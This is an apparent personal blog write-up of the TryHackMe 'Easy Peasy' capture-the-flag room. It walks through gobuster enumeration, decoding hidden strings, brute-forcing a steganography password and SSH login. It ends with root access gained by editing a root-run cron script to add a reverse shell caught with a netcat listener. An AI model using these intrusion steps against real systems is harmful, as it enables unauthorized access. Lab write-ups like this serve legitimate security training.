---
layout: post
title: Writeup - THM - Easy-Peasy
description: "Walkthrough of Easy-Peasy of TryHackme"
tags: [TryHackeMe, EasyPeasy, Hacking, pwned, nmap, gobuster, steganography, cronjob]
author: Fr3akazo1d!
---
# Walkthrough

Used gobuster 
- gobuster dir -u http://10.10.201.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster-output.txt

found hidden directory

after researching the site, nothing interesting was found on the website. 

But for the answer of TryHackMe, something has to be on the site. 
So i keep digging around on the webserver. 

I tried another gobuster run on the hidden directory. 

Found another directory. 
Was another picture and then i checked the source code. In the Source code there was a hidden paragraph:  
```html
</head>
<body>
<center>
<p hidden>Z**********************=</p>
</center>
</body>
</html>
```


No i have my first flag, the code was Base64. 
we can decode the base64 string in the terminal:
```sh
┌──(fr3akazo1d㉿fr3ak0ut)-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─$ echo "************************" | base64 -d 
flag{f********g}
```

After a lot of seraching on Port 80 on the Server, i was swtiching to the other Webserver witch is running on port 65524. 


On this webserver i also run a gobuster run, and found robots.txt file. 
looked inside the robots.txt file and found a hash. 

```html
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```


The hash was crackable with only one website. after decypting the hash we got our second flag. 

On The apache website there is the third flag locatet, we have to look closely. :)

For the hidden directory. i was going through the source code of the apache server. i found an interessting part with a string who looks like a hash:
<p hidden>its encoded with ba....:O**********************u</p>

i was triying to decrypt the hash with base64, but it was no base64 hash. I tried different ways till i found the right base decoder. 
The string gave me the name of the hidden directory. 

http://10.10.249.230:65524/n***************r/

on this page we found another hash. Whitch we have to decrpt. 
Also a picture was provided on this site. 

Downloaded the picture and started brute force attack on the picture with the txt file which we have donwloaded from tryhackem. 

a other way is to crack the password with hashcat, as a hint from tryhackme. the has is GOST.

The txt file was containg the password, and extracted a new text file where a username and password was stored. 
```sh
┌──(fr3akazo1d㉿fr3ak0ut)-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─$ s********** binarycodepixabay.jpg easypeasy.txt                                                               1 ⨯
S********** 2.0.9 - (https://github.com/Paradoxis/s**********)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'binarycodepixabay.jpg' with wordlist 'easypeasy.txt'..
Successfully cracked file with password: m******************b
Tried 3585 passwords
Your file has been written to: binarycodepixabay.jpg.out
m******************b
```

```sh
bat binarycodepixabay.jpg.out 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: binarycodepixabay.jpg.out
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ username:b****g
   2   │ password:
   3   │ 01101001 ******** ******** ******** ******** ******** ******** ******** ******** ******** ******** ******** *
       │ ******* ******** ******** ******** ******** ******** ******** ******** ******** ******** ******** ******** **
       │ ****** ******** ******** 01111001
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

The password was decoded in binary. after decoding we have now the password for the user to the target. 

```sh
i**************************y
```

We can now login with the user and read the user.txt file. 

```sh
┌──(fr3akazo1d㉿fr3ak0ut)-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─$  ssh 10.10.249.230 -p 6498 -l b****g -p i**************************y
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized        **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
b****g@10.10.249.230's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
b****g@kral4-PC:~$ ls
user.txt
b****g@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
s**t{a**************y}
```

After some researching i came a cross the cronjob. 


```sh
b****g@kral4-PC:/$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
25 6  * * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7 root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

on cronjob is running as root. I added a reverse shell to the file and a listener on my machine. 


```sh
b****g@kral4-PC:/$ nano var/www/.mysecretcronjob.sh 
```


# root shell

After some seconds i got a root shell. now we can read the root.txt file


```sh
┌──(fr3akazo1d㉿fr3ak0ut)-[~/PenetrationTesting/THM/Boxes/EasyPeasy]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.9.170.39] from (UNKNOWN) [10.10.249.230] 53294
bash: cannot set terminal process group (1509): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# cat root.txt  
cat root.txt 
flag{6******************************5}
root@kral4-PC:~# 
```

summary

This box was a lot enumeration with gobuster. Sometimes i was stucked at this. I tried some different ways but i was really fustrated that i read another writeup for the room. 
